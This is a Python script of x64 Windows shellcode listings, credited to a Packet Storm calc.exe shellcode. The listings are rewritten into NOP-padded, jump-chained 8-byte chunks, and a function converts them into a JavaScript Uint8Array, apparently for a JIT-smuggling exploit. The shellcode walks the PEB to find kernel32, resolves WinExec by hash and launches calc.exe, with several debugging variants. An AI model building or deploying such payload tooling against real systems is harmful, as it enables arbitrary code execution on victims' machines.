# +6f
assembly0="""#######################################################################################################
### https://packetstormsecurity.com/files/173820/Windows-x64-PIC-NULL-Free-Calc.exec-Shellcode.html ###
#######################################################################################################
"find_kernel32:"
  0: 90 48 31 d2 90 90 eb XX        xor    rdx,rdx
  8: GARBAGE 0A
 12: 65 48 8b 42 60 90 eb XX        mov    rax,QWORD PTR gs:[rdx+0x60]
 1a: GARBAGE 0A
 24: 48 8b 70 18 90 90 eb XX        mov    rsi,QWORD PTR [rax+0x18]
 XX: GARBAGE 0A
 36: 48 8b 76 20 90 90 eb XX        mov    rsi,QWORD PTR [rsi+0x20]
 XX: GARBAGE 0A
 48: 4c 8b 0e 90 90 90 eb XX        mov    r9,QWORD PTR [rsi]
 XX: GARBAGE 0A
 5A: 4d 8b 09 90 90 90 eb XX        mov    r9,QWORD PTR [r9]
 XX: GARBAGE 0A
 6C: 4d 8b 49 20 90 90 eb XX        mov    r9,QWORD PTR [r9+0x20]
 XX: GARBAGE 0A
 ################################################################## 7E: eb 63 90 90 90 90 eb XX        jmp    0x7f  # jmp call_winexec
 7E: e9 4a 03 00 00 90 eb XX        jmp    call_winexec
 XX: GARBAGE 0A
"parse_module"
 90: 41 8b 49 3c 90 90 eb XX        mov    ecx,DWORD PTR [r9+0x3c]
 XX: GARBAGE 0A
 A2: 4d 31 ff 90 90 90 eb XX        xor    r15,r15
 XX: GARBAGE 0A
 B4: 41 b7 88 90 90 90 eb XX        mov    r15b,0x88
 XX: GARBAGE 0A
 C6: 4d 01 cf 90 90 90 eb XX        add    r15,r9
 XX: GARBAGE 0A
 D8: 49 01 cf 90 90 90 eb XX        add    r15,rcx
 XX: GARBAGE 0A
 EA: 45 8b 3f 90 90 90 eb XX        mov    r15d,DWORD PTR [r15]
 XX: GARBAGE 0A
 FC: 90 4d 01 cf 90 90 eb XX        add    r15,r9 # duplicate
 XX: GARBAGE 0A
10E: 41 8b 4f 18 90 90 eb XX        mov    ecx,DWORD PTR [r15+0x18]
 XX: GARBAGE 0A
120: 45 8b 77 20 90 90 eb XX        mov    r14d,DWORD PTR [r15+0x20] <- after this, the offset change to 0F
 XX: GARBAGE 0D
132: 4d 01 ce 90 90 90 eb XX        add    r14,r9
 XX: GARBAGE 0D
"search_function"
#################################################################### 144: e3 00 00 00 02 90 eb XX        jrcxz  0x7e # jrcxz not_found
132: 48 85 c9 90 90 90 eb XX        test   rcx,rcx
 XX: GARBAGE 0D
132: 75 2c 90 90 90 90 eb XX        jne    skip
 XX: GARBAGE 0D
132: e9 23 02 00 00 90 eb XX        jmp    not_found
 XX: GARBAGE 0D
"skip"
156: ff c9 90 90 90 90 eb XX        dec    ecx
 XX: GARBAGE 0D
168: 48 31 f6 90 90 90 eb XX        xor    rsi,rsi
 XX: GARBAGE 0D
17A: 41 8b 34 8e 90 90 eb XX        mov    esi,DWORD PTR [r14+rcx*4] <- died here?
 XX: GARBAGE 0D
18C: 4c 01 ce 90 90 90 eb XX        add    rsi,r9
 XX: GARBAGE 0D
"function_hashing:"
19E: 48 31 c0 90 90 90 eb XX        xor    rax,rax
 XX: GARBAGE 0D
1B0: 90 90 48 31 d2 90 eb XX        xor    rdx,rdx
 XX: GARBAGE 0D
1C2: fc 90 90 90 90 90 eb XX        cld
 XX: GARBAGE 0D
"iteration:" 
1D4: ac 90 90 90 90 90 eb XX        lods   al,BYTE PTR ds:[rsi]
 XX: GARBAGE 0D
1E6: 84 c0 90 90 90 90 eb XX        test   al,al
 XX: GARBAGE 0D
1F8: 74 5a 90 90 90 90 eb XX        je     0x5e # compare_hash
 XX: GARBAGE 0D
20A: c1 ca 0d 90 90 90 eb XX        ror    edx,0xd
 XX: GARBAGE 0D
21C: 01 c2 90 90 90 90 eb XX        add    edx,eax
 XX: GARBAGE 0D
22E: e9 88 ff ff ff 90 eb XX        jmp    0x52 # iteration
 XX: GARBAGE 0D
"compare_hash:" 
240: 44 39 c2 90 90 90 eb XX        cmp    edx,r8d
 XX: GARBAGE 0D
252: 0F 85 73 FE FF FF eb XX        jne    0x3d # search_function
 XX: GARBAGE 0D
264: 45 8b 57 24 90 90 eb XX        mov    r10d,DWORD PTR [r15+0x24]
 XX: GARBAGE 0D
276: 4d 01 ca 90 90 90 eb XX        add    r10,r9
 XX: GARBAGE 0D
288: 41 0f b7 0c 4a 90 eb XX        movzx  ecx,WORD PTR [r10+rcx*2]
 XX: GARBAGE 0D
29A: 45 8b 5f 1c 90 90 eb XX        mov    r11d,DWORD PTR [r15+0x1c]
 XX: GARBAGE 0D
2AC: 4d 01 cb 90 90 90 eb XX        add    r11,r9
 XX: GARBAGE 0D
2BE: 41 8b 04 8b 90 90 eb XX        mov    eax,DWORD PTR [r11+rcx*4]
 XX: GARBAGE 0D
2D0: 4c 01 c8 90 90 90 eb XX        add    rax,r9
 XX: GARBAGE 0D
2E2: c3 90 90 90 90 90 eb XX        ret
 XX: GARBAGE 0D
"not_found"
2F4: 90 c3 90 90 90 90 eb XX        ret
 XX: GARBAGE 0D
"call_winexec:"
306: 41 b8 98 fe 8a 0e eb XX      mov    r8d,0xe8afe98
 XX: GARBAGE 0D
318: e8 a9 fc ff ff 90 eb XX      call   0x1c # parse_module
 XX: GARBAGE 0D
32A: 48 31 c9 90 90 90 eb XX      xor    rcx,rcx
 XX: GARBAGE 0D
33C: 51 90 90 90 90 90 eb XX      push   rcx
 XX: GARBAGE 0D
######################################################## 8e: 48 b9 63 61 6c 63 2e 65 78 65    movabs rcx,0x6578652e 636c6163
34E: 4d 31 d2 90 90 90 eb XX      xor    r10,r10
 XX: GARBAGE 0D
360: 41 ba 63 61 6c 63 eb XX      mov    r10d,0x636c6163
 XX: GARBAGE 0D
372: b9 2e 65 78 65 90 eb XX      mov    ecx,0x6578652e
 XX: GARBAGE 0D
384: 48 c1 e1 20 90 90 eb XX      shl    rcx,0x20
########################################################
 XX: GARBAGE 0D
396: 4c 01 d1 90 90 90 eb XX      add    rcx,r10
 XX: GARBAGE 0D
3A8: 90 51 90 90 90 90 eb XX      push   rcx
 XX: GARBAGE 0D
3BA: 48 8d 0c 24 90 90 eb XX      lea    rcx,[rsp]
 XX: GARBAGE 0D
3CE: 48 31 d2 90 90 90 eb XX      xor    rdx,rdx <- after this need to 0E
 XX: GARBAGE 0D
3E0: 48 ff c2 90 90 90 eb XX      inc    rdx
 XX: GARBAGE 0D
3F2: 48 83 ec 28 90 90 eb XX      sub    rsp,0x28
 XX: GARBAGE 0D
404: ff d0 90 90 90 90 eb XX      call   rax
 XX: GARBAGE 0D
416: 90 90 90 90 90 90 90 90
 XX: GARBAGE 0D"""


# +69
# https://www.binaryconvert.com/result_signed_int.html?hexadecimal=CAFEBABE
# -889275714 to hex is -0x35014542
# -0x35014542 / 2 = -0x1A80A2A1
assembly1="""0: 48 31 c0 90 90 90 eb XX               xor    rax,rax
 XX: GARBAGE 0A
3: b8 be ba fe ca 90 eb XX         mov    eax,0xcafebabe
 XX: GARBAGE 0A
8: c3 90 90 90 90 90 eb XX         ret
 XX: GARBAGE 0A"""


assembly2="""#######################################################################################################
### https://packetstormsecurity.com/files/173820/Windows-x64-PIC-NULL-Free-Calc.exec-Shellcode.html ###
#######################################################################################################
"find_kernel32:"
  0: 90 48 31 d2 90 90 eb XX        xor    rdx,rdx
  8: GARBAGE 0A
 12: 65 48 8b 42 60 90 eb XX        mov    rax,QWORD PTR gs:[rdx+0x60]
 1a: GARBAGE 0A
 24: 48 8b 70 18 90 90 eb XX        mov    rsi,QWORD PTR [rax+0x18]
 XX: GARBAGE 0A
 36: 48 8b 76 20 90 90 eb XX        mov    rsi,QWORD PTR [rsi+0x20]
 XX: GARBAGE 0A
 48: 4c 8b 0e 90 90 90 eb XX        mov    r9,QWORD PTR [rsi]
 XX: GARBAGE 0A
 5A: 4d 8b 09 90 90 90 eb XX        mov    r9,QWORD PTR [r9]
 XX: GARBAGE 0A
 6C: 4d 8b 49 20 90 90 eb XX        mov    r9,QWORD PTR [r9+0x20]
 XX: GARBAGE 0A
 ################################################################## 7E: eb 63 90 90 90 90 eb XX        jmp    0x7f  # jmp call_winexec
 7E: e9 4a 03 00 00 90 eb XX        jmp    call_winexec
 XX: GARBAGE 0A
"parse_module"
 90: 41 8b 49 3c 90 90 eb XX        mov    ecx,DWORD PTR [r9+0x3c]
 XX: GARBAGE 0A
 A2: 4d 31 ff 90 90 90 eb XX        xor    r15,r15
 XX: GARBAGE 0A
 B4: 41 b7 88 90 90 90 eb XX        mov    r15b,0x88
 XX: GARBAGE 0A
 C6: 4d 01 cf 90 90 90 eb XX        add    r15,r9
 XX: GARBAGE 0A
 D8: 49 01 cf 90 90 90 eb XX        add    r15,rcx
 XX: GARBAGE 0A
 EA: 45 8b 3f 90 90 90 eb XX        mov    r15d,DWORD PTR [r15]
 XX: GARBAGE 0A
 FC: 90 4d 01 cf 90 90 eb XX        add    r15,r9 # duplicate
 XX: GARBAGE 0A
10E: 41 8b 4f 18 90 90 eb XX        mov    ecx,DWORD PTR [r15+0x18]
 XX: GARBAGE 0A
120: 45 8b 77 20 90 90 eb XX        mov    r14d,DWORD PTR [r15+0x20] <- after this, the offset change to 0F
 XX: GARBAGE 0D
132: 4d 01 ce 90 90 90 eb XX        add    r14,r9
 XX: GARBAGE 0D
"search_function"
#################################################################### 144: e3 00 00 00 02 90 eb XX        jrcxz  0x7e # jrcxz not_found
132: 48 85 c9 90 90 90 eb XX        test   rcx,rcx
 XX: GARBAGE 0D
132: 75 2c 90 90 90 90 eb XX        jne    skip
 XX: GARBAGE 0D
132: e9 23 02 00 00 90 eb XX        jmp    not_found
 XX: GARBAGE 0D
"skip"
156: ff c9 90 90 90 90 eb XX        dec    ecx
 XX: GARBAGE 0D
168: 48 31 f6 90 90 90 eb XX        xor    rsi,rsi
 XX: GARBAGE 0D
17A: 41 8b 34 8e 90 90 eb XX        mov    esi,DWORD PTR [r14+rcx*4] <- died here?
 XX: GARBAGE 0D
18C: 4c 01 ce 90 90 90 eb XX        add    rsi,r9
 XX: GARBAGE 0D
"function_hashing:"
19E: 48 31 c0 90 90 90 eb XX        xor    rax,rax
 XX: GARBAGE 0D
1B0: 90 90 48 31 d2 90 eb XX        xor    rdx,rdx
 XX: GARBAGE 0D
1C2: fc 90 90 90 90 90 eb XX        cld
 XX: GARBAGE 0D
"iteration:" 
1D4: ac 90 90 90 90 90 eb XX        lods   al,BYTE PTR ds:[rsi]
 XX: GARBAGE 0D
1E6: 84 c0 90 90 90 90 eb XX        test   al,al
 XX: GARBAGE 0D
1F8: 74 5a 90 90 90 90 eb XX        je     0x5e # compare_hash
 XX: GARBAGE 0D
20A: c1 ca 0d 90 90 90 eb XX        ror    edx,0xd
 XX: GARBAGE 0D
21C: 01 c2 90 90 90 90 eb XX        add    edx,eax
 XX: GARBAGE 0D
22E: e9 88 ff ff ff 90 eb XX        jmp    0x52 # iteration
 XX: GARBAGE 0D
"compare_hash:" 
240: 44 39 c2 90 90 90 eb XX        cmp    edx,r8d
 XX: GARBAGE 0D
252: 0F 85 73 FE FF FF eb XX        jne    0x3d # search_function
 XX: GARBAGE 0D
264: 45 8b 57 24 90 90 eb XX        mov    r10d,DWORD PTR [r15+0x24]
 XX: GARBAGE 0D
276: 4d 01 ca 90 90 90 eb XX        add    r10,r9
 XX: GARBAGE 0D
288: 41 0f b7 0c 4a 90 eb XX        movzx  ecx,WORD PTR [r10+rcx*2]
 XX: GARBAGE 0D
29A: 45 8b 5f 1c 90 90 eb XX        mov    r11d,DWORD PTR [r15+0x1c]
 XX: GARBAGE 0D
2AC: 4d 01 cb 90 90 90 eb XX        add    r11,r9
 XX: GARBAGE 0D
2BE: 41 8b 04 8b 90 90 eb XX        mov    eax,DWORD PTR [r11+rcx*4]
 XX: GARBAGE 0D
2D0: 4c 01 c8 90 90 90 eb XX        add    rax,r9
 XX: GARBAGE 0D
2E2: c3 90 90 90 90 90 eb XX        ret
 XX: GARBAGE 0D
"not_found"
2F4: 90 c3 90 90 90 90 eb XX        ret
 XX: GARBAGE 0D
"call_winexec:"
306: 41 b8 72 fe b3 16 eb XX      mov    r8d,0x16B3FE72
 XX: GARBAGE 0D
318: e8 a9 fc ff ff 90 eb XX      call   0x1c # parse_module
 XX: GARBAGE 0D
32A: 48 31 c9 90 90 90 eb XX      xor    rcx,rcx
 XX: GARBAGE 0D
33C: 51 90 90 90 90 90 eb XX      push   rcx
 XX: GARBAGE 0D
######################################################## 8e: 48 b9 63 61 6c 63 2e 65 78 65    movabs rcx,0x6578652e 636c6163
34E: 4d 31 d2 90 90 90 eb XX      xor    r10,r10
 XX: GARBAGE 0D
360: 41 ba 63 61 6c 63 eb XX      mov    r10d,0x636c6163
 XX: GARBAGE 0D
372: b9 2e 65 78 65 90 eb XX      mov    ecx,0x6578652e
 XX: GARBAGE 0D
384: 48 c1 e1 20 90 90 eb XX      shl    rcx,0x20
########################################################
 XX: GARBAGE 0D
396: 4c 01 d1 90 90 90 eb XX      add    rcx,r10
 XX: GARBAGE 0D
3A8: 90 51 90 90 90 90 eb XX      push   rcx
 XX: GARBAGE 0D
3BA: 48 8d 0c 24 90 90 eb XX      lea    rcx,[rsp]
 XX: GARBAGE 0D
  0: 48 89 ce 90 90 90 eb XX      mov    rsi,rcx
 XX: GARBAGE 0D
  0: 48 31 db 90 90 90 eb XX      xor    rbx,rbx
 XX: GARBAGE 0D
  3: 90 48 31 c9 90 90 eb XX      xor    rcx,rcx
 XX: GARBAGE 0D
  6: b1 ff 90 90 90 90 eb XX      mov    cl,0xff
 XX: GARBAGE 0D
"ZERO_LOOP"
  8: 53 90 90 90 90 90 eb XX      push   rbx
 XX: GARBAGE 0D 
  9: e2 e7 90 90 90 90 eb XX      loop   8 ZERO_LOOP
 XX: GARBAGE 0D 
  0: 56 90 90 90 90 90 eb XX      push   rsi
 XX: GARBAGE 0D 
  1: 90 56 90 90 90 90 eb XX      push   rsi
 XX: GARBAGE 0D 
  2: 90 53 90 90 90 90 eb XX      push   rbx
 XX: GARBAGE 0D 
  3: 90 90 53 90 90 90 eb XX      push   rbx
 XX: GARBAGE 0D 
  4: 90 90 90 53 90 90 eb XX      push   rbx
 XX: GARBAGE 0D 
  5: 90 90 90 90 53 90 eb XX      push   rbx
 XX: GARBAGE 0D 
  6: 90 90 90 90 90 53 eb XX      push   rbx
 XX: GARBAGE 0D 
  0: 4d 31 c0 90 90 90 eb XX      xor    r8,r8
 XX: GARBAGE 0D 
  7: 41 50 90 90 90 90 eb XX      push   r8
 XX: GARBAGE 0D 
  1: 90 90 56 90 90 90 eb XX      push   rsi
 XX: GARBAGE 0D 
  9: 90 90 41 50 90 90 eb XX     push   r8
 XX: GARBAGE 0D 
  a: 48 89 d9 90 90 90 eb XX     mov    rcx,rbx
 XX: GARBAGE 0D 
  d: 48 89 f2 90 90 90 eb XX     mov    rdx,rsi
 XX: GARBAGE 0D 
 10: 49 89 d8 90 90 90 eb XX     mov    r8,rbx
 XX: GARBAGE 0D 
 13: 49 89 d9 90 90 90 eb XX     mov    r9,rbx
 XX: GARBAGE 0D 
404: ff d0 90 90 90 90 eb XX      call   rax
 XX: GARBAGE 0D
416: 90 90 90 90 90 90 90 90
 XX: GARBAGE 0D"""


# +6f
assembly="""#######################################################################################################
### https://packetstormsecurity.com/files/173820/Windows-x64-PIC-NULL-Free-Calc.exec-Shellcode.html ###
#######################################################################################################
"find_kernel32:"
  0: 90 48 31 d2 90 90 eb XX        xor    rdx,rdx
  8: GARBAGE 0A
 12: 65 48 8b 42 60 90 eb XX        mov    rax,QWORD PTR gs:[rdx+0x60]
 1a: GARBAGE 0A
 24: 48 8b 70 18 90 90 eb XX        mov    rsi,QWORD PTR [rax+0x18]
 XX: GARBAGE 0A
 36: 48 8b 76 20 90 90 eb XX        mov    rsi,QWORD PTR [rsi+0x20]
 XX: GARBAGE 0A
 48: 4c 8b 0e 90 90 90 eb XX        mov    r9,QWORD PTR [rsi]
 XX: GARBAGE 0A
 5A: 4d 8b 09 90 90 90 eb XX        mov    r9,QWORD PTR [r9]
 XX: GARBAGE 0A
 6C: 4d 8b 49 20 90 90 eb XX        mov    r9,QWORD PTR [r9+0x20]
 XX: GARBAGE 0A
 ################################################################## 7E: eb 63 90 90 90 90 eb XX        jmp    0x7f  # jmp call_winexec
 7E: e9 4a 03 00 00 90 eb XX        jmp    call_winexec
 XX: GARBAGE 0A
"parse_module"
 90: 41 8b 49 3c 90 90 eb XX        mov    ecx,DWORD PTR [r9+0x3c]
 XX: GARBAGE 0A
 A2: 4d 31 ff 90 90 90 eb XX        xor    r15,r15
 XX: GARBAGE 0A
 B4: 41 b7 88 90 90 90 eb XX        mov    r15b,0x88
 XX: GARBAGE 0A
 C6: 4d 01 cf 90 90 90 eb XX        add    r15,r9
 XX: GARBAGE 0A
 D8: 49 01 cf 90 90 90 eb XX        add    r15,rcx
 XX: GARBAGE 0A
 EA: 45 8b 3f 90 90 90 eb XX        mov    r15d,DWORD PTR [r15]
 XX: GARBAGE 0A
 FC: 90 4d 01 cf 90 90 eb XX        add    r15,r9 # duplicate
 XX: GARBAGE 0A
10E: 41 8b 4f 18 90 90 eb XX        mov    ecx,DWORD PTR [r15+0x18]
 XX: GARBAGE 0A
120: 45 8b 77 20 90 90 eb XX        mov    r14d,DWORD PTR [r15+0x20] <- after this, the offset change to 0F
 XX: GARBAGE 0D
132: 4d 01 ce 90 90 90 eb XX        add    r14,r9
 XX: GARBAGE 0D
"search_function"
#################################################################### 144: e3 00 00 00 02 90 eb XX        jrcxz  0x7e # jrcxz not_found
132: 48 85 c9 90 90 90 eb XX        test   rcx,rcx
 XX: GARBAGE 0D
132: 75 2c 90 90 90 90 eb XX        jne    skip
 XX: GARBAGE 0D
132: e9 23 02 00 00 90 eb XX        jmp    not_found
 XX: GARBAGE 0D
"skip"
156: ff c9 90 90 90 90 eb XX        dec    ecx
 XX: GARBAGE 0D
168: 48 31 f6 90 90 90 eb XX        xor    rsi,rsi
 XX: GARBAGE 0D
17A: 41 8b 34 8e 90 90 eb XX        mov    esi,DWORD PTR [r14+rcx*4] <- died here?
 XX: GARBAGE 0D
18C: 4c 01 ce 90 90 90 eb XX        add    rsi,r9
 XX: GARBAGE 0D
"function_hashing:"
19E: 48 31 c0 90 90 90 eb XX        xor    rax,rax
 XX: GARBAGE 0D
1B0: 90 90 48 31 d2 90 eb XX        xor    rdx,rdx
 XX: GARBAGE 0D
1C2: fc 90 90 90 90 90 eb XX        cld
 XX: GARBAGE 0D
"iteration:" 
1D4: ac 90 90 90 90 90 eb XX        lods   al,BYTE PTR ds:[rsi]
 XX: GARBAGE 0D
1E6: 84 c0 90 90 90 90 eb XX        test   al,al
 XX: GARBAGE 0D
1F8: 74 5a 90 90 90 90 eb XX        je     0x5e # compare_hash
 XX: GARBAGE 0D
20A: c1 ca 0d 90 90 90 eb XX        ror    edx,0xd
 XX: GARBAGE 0D
21C: 01 c2 90 90 90 90 eb XX        add    edx,eax
 XX: GARBAGE 0D
22E: e9 88 ff ff ff 90 eb XX        jmp    0x52 # iteration
 XX: GARBAGE 0D
"compare_hash:" 
240: 44 39 c2 90 90 90 eb XX        cmp    edx,r8d
 XX: GARBAGE 0D
252: 0F 85 73 FE FF FF eb XX        jne    0x3d # search_function
 XX: GARBAGE 0D
264: 45 8b 57 24 90 90 eb XX        mov    r10d,DWORD PTR [r15+0x24]
 XX: GARBAGE 0D
276: 4d 01 ca 90 90 90 eb XX        add    r10,r9
 XX: GARBAGE 0D
288: 41 0f b7 0c 4a 90 eb XX        movzx  ecx,WORD PTR [r10+rcx*2]
 XX: GARBAGE 0D
29A: 45 8b 5f 1c 90 90 eb XX        mov    r11d,DWORD PTR [r15+0x1c]
 XX: GARBAGE 0D
2AC: 4d 01 cb 90 90 90 eb XX        add    r11,r9
 XX: GARBAGE 0D
2BE: 41 8b 04 8b 90 90 eb XX        mov    eax,DWORD PTR [r11+rcx*4]
 XX: GARBAGE 0D
2D0: 4c 01 c8 90 90 90 eb XX        add    rax,r9
 XX: GARBAGE 0D
2E2: c3 90 90 90 90 90 eb XX        ret
 XX: GARBAGE 0D
"not_found"
2F4: 90 c3 90 90 90 90 eb XX        ret
 XX: GARBAGE 0D
"call_winexec:"
306: 41 b8 98 fe 8a 0e eb XX      mov    r8d,0xe8afe98
 XX: GARBAGE 0D
318: e8 a9 fc ff ff 90 eb XX      call   0x1c # parse_module
 XX: GARBAGE 0D
32A: 48 31 c9 90 90 90 eb XX      xor    rcx,rcx
 XX: GARBAGE 0D
33C: 51 90 90 90 90 90 eb XX      push   rcx
 XX: GARBAGE 0D
######################################################## 8e: 48 b9 63 61 6c 63 2e 65 78 65    movabs rcx,0x6578652e 636c6163
34E: 4d 31 d2 90 90 90 eb XX      xor    r10,r10
 XX: GARBAGE 0D
360: 41 ba 63 61 6c 63 eb XX      mov    r10d,0x636c6163
 XX: GARBAGE 0D
372: b9 2e 65 78 65 90 eb XX      mov    ecx,0x6578652e
 XX: GARBAGE 0D
384: 48 c1 e1 20 90 90 eb XX      shl    rcx,0x20
########################################################
 XX: GARBAGE 0D
396: 4c 01 d1 90 90 90 eb XX      add    rcx,r10
 XX: GARBAGE 0D
3A8: 90 51 90 90 90 90 eb XX      push   rcx
 XX: GARBAGE 0D
3BA: 48 8d 0c 24 90 90 eb XX      lea    rcx,[rsp]
 XX: GARBAGE 0D
3CE: 48 31 d2 90 90 90 eb XX      xor    rdx,rdx <- after this need to 0E
 XX: GARBAGE 0D
3E0: 48 ff c2 90 90 90 eb XX      inc    rdx
 XX: GARBAGE 0D
3F2: 48 83 ec 48 90 90 eb XX      sub    rsp,0x48 // mod this, create a bigger margin
 XX: GARBAGE 0D
3F2: 48 83 ec 58 90 90 eb XX      sub    rsp,0x58 // mod this, create a bigger margin
 XX: GARBAGE 0D
3F2: 48 83 ec 68 90 90 eb XX      sub    rsp,0x68 // mod this, create a bigger margin
 XX: GARBAGE 0D
3F2: 48 83 ec 78 90 90 eb XX      sub    rsp,0x78 // mod this, create a bigger margin
 XX: GARBAGE 0D
  0: 90 90 52 90 90 90 eb XX      push   rdx
 XX: GARBAGE 0D
  1: 90 90 51 90 90 90 eb XX      push   rcx
 XX: GARBAGE 0D
404: ff d0 90 90 90 90 eb XX      call   rax
 XX: GARBAGE 0D
416: 90 90 90 90 90 90 90 90
 XX: GARBAGE 0D"""




def clean():
	ver1 = ""
	for index, line in enumerate(assembly.split("\n")):
		if ("###" in line) or (line[0] == "\""):
			continue
		else:
			ver1 += line
			ver1 += "\n"

	ver2 = ""
	for index, line in enumerate(ver1.split("\n")):		
		if index % 2 == 0:
			try:
				if "00 00 00" in line:
					print("JMP/CALL-like instruction detected which needs fixing: {}".format(line))
				line = line[line.find(":")+2:]
				line = line[:line.find("  ")].strip()
				offset = ver1.split("\n")[index+1]
				offset = offset[offset.find(":")+2+5+3:]
				line = line[:-3]
				final = line + " " + hex(int(offset,16)+2)[2:]
				ver2 += final
				ver2 += "\n"
			except:
				continue
	ver3 = ""
	dup = {x for x in ver2.split("\n") if ver2.split("\n").count(x) > 1}
	if len(dup) != 0:
		print("Duplicate detected: {}".format(dup))		

	print("new Uint8Array([", end="")
	for index, line in enumerate(ver2.split("\n")):		
		for char in line.split(" "):
			print("0x{},".format(char), end="")
	print("])")	
				
clean()





